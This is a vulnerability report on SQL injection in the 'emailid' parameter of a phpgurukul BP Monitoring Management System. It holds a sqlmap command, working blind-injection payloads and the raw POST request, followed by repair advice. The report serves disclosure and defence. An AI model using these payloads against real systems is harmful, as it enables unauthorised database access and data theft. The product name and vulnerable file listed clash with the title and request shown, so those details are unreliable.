# phpgurukul BP Monitoring Management System using PHP and MySQL V1.0 /registration.php SQL injection

# NAME OF AFFECTED PRODUCT(S)

- Company Visitors Management System

## Vendor Homepage

- https://phpgurukul.com/company-visitor-management-system-using-php-and-mysql/

# AFFECTED AND/OR FIXED VERSION(S)

## submitter

- Rmyxx

## Vulnerable File

- /registration.php

## VERSION(S)

- V1.0

## Software Link

- https://phpgurukul.com/bp-monitoring-management-system-using-php-and-mysql/

# PROBLEM TYPE

## Vulnerability Type

- SQL injection

## Root Cause

- A SQL injection vulnerability was identified within the "/registration.php" file of the "BP Monitoring Management System using PHP and MySQL" project. The root cause lies in the fact that attackers can inject malicious code via the parameter "emailid". This input is then directly utilized in SQL queries without undergoing proper sanitization or validation processes. As a result, attackers are able to fabricate input values, manipulate SQL queries, and execute unauthorized operations.

## Impact

- Exploiting this SQL injection vulnerability allows attackers to gain unauthorized access to the database, cause sensitive data leakage,  tamper with data, gain complete control over the system, and even  disrupt services. This poses a severe threat to both the security of the system and the continuity of business operations.

# DESCRIPTION

- During the security assessment of "BP Monitoring Management System using PHP and MySQL", I detected a critical SQL injection vulnerability in the  "/registration.php" file. This vulnerability is attributed to the  insufficient validation of user input for the "emailid" parameter. This  inadequacy enables attackers to inject malicious SQL queries.  Consequently, attackers can access the database without proper  authorization, modify or delete data, and obtain sensitive information.  Immediate corrective actions are essential to safeguard system security  and uphold data integrity.

# Vulnerability details and POC

## Vulnerability location:

- "emailid" parameter

## Payload:

python sqlmap.py -r 1.txt -p emailid -dbms=mysql -dbs

```
Here are the results of sqlmap：


POST parameter 'emailid' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 72 HTTP(s) requests:
---
Parameter: emailid (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: emailid=john@test.com' AND 5328=5328 AND 'GPpu'='GPpu

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: emailid=john@test.com' AND (SELECT 4967 FROM (SELECT(SLEEP(5)))hhry) AND 'FNwB'='FNwB
---
[18:02:20] [INFO] the back-end DBMS is MySQL
web application technology: Apache 2.4.39, PHP 8.0.2
back-end DBMS: MySQL >= 5.0.12
[18:02:20] [INFO] fetched data logged to text files under 'C:\Users\Rmyxx\AppData\Local\sqlmap\output\cve'

```

​     the following is 1.txt

```
1.txt




POST /bpmms/check_availability.php HTTP/1.1
Host: cve
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://cve
Referer: http://cve/bpmms/registration.php
Accept: */*
Accept-Encoding: gzip, deflate
Cookie: PHPSESSID=1aflt39bmsiu75til126sqsd5m
Content-Length: 22

emailid=john@test.com

```



## Vulnerability Request Packet

```
POST /bpmms/check_availability.php HTTP/1.1
Host: cve
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://cve
Referer: http://cve/bpmms/registration.php
Accept: */*
Accept-Encoding: gzip, deflate
Cookie: PHPSESSID=1aflt39bmsiu75til126sqsd5m
Content-Length: 22

emailid=john@test.com

```

​      

## The following are screenshots of some specific information obtained from testing and running with the sqlmap tool:



```
python sqlmap.py -r 1.txt -p emailid -dbms=mysql -dbs
```

![image-20250606180708212](C:\Users\Rmyxx\AppData\Roaming\Typora\typora-user-images\image-20250606180708212.png)







# Suggested repair

1. **Employ prepared statements and parameter binding:**
   Prepared statements serve as an effective safeguard against SQL  injection as they segregate SQL code from user input data. When using  prepared statements, user - entered values are treated as mere data and  will not be misconstrued as SQL code.
2. **Conduct input validation and filtering:**
   Rigorously validate and filter user input data to guarantee that it  conforms to the expected format. This helps in blocking malicious input.
3. **Minimize database user permissions:**
   Ensure that the account used to connect to the database has only the  minimum required permissions. Avoid using accounts with elevated  privileges (such as 'root' or 'admin') for day - to - day operations.